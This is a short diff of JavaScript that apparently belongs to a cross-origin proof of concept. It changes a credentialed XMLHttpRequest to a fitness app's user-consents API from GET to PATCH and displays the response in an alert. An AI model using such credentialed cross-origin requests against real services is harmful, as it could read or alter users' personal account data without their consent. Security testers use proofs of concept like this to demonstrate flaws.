@@ -12,7 +12,7 @@
                  document.getElementById("demo").innerHTML = alert(this.responseText);
                  }
              };
-              xhr.open("GET",
+              xhr.open("PATCH",
                        "https://www.myfitnespal.com/api/idm/user-with-consents", true);
              xhr.withCredentials = true;
              xhr.send();
